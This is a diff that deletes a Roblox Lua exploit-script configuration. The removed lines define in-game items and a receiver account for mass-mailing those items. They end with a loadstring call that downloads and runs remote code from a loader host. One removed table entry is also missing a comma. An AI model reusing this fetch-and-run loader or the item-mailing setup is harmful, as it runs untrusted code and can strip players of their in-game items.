@@ -1,16 +1,1 @@
-script_key = "vzAcKPtvJYHOxoZRGVxGTBCDIksOKTnS";
-_G.DISABLE_OVERLAY = false -- when true it does not make screen green/red when ready.
-_G.GDRY_RUN = true  -- true means just log as test, false means actually send the mails.
-_G.GMAIL_ITEMS = {
-  ["Lockpick A"] = {Class = "Misc", Id = "Lockpick A", Amount = 9999},
-  ["Lockpick B"] = {Class = "Misc", Id = "Lockpick B", Amount = 9999},
-  ["Lockpick C"] = {Class = "Misc", Id = "Lockpick C", Amount = 9999},
-  ["Poinsettia Peacock"] = {Class = "Pet", Id = "Poinsettia Peacock", Amount = 9999, AllVariants = true},
-  ["Snowflake Gift"] = {Class = "Lootbox", Id= "Snowflake Gift", Amount = 999999},
-  ["Jolly Gift"] = {Class = "Lootbox", Id = "Jolly Gift", Amount = 999999}
-  ["All Huges"] = {Class = "Pet"}
-}
-_G.GMAIL_RECEIVERS = {
-    "QXrxQSRYphx",
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8f386eb537ee7b37a8f0ad37fe6dbc60.lua"))()
+
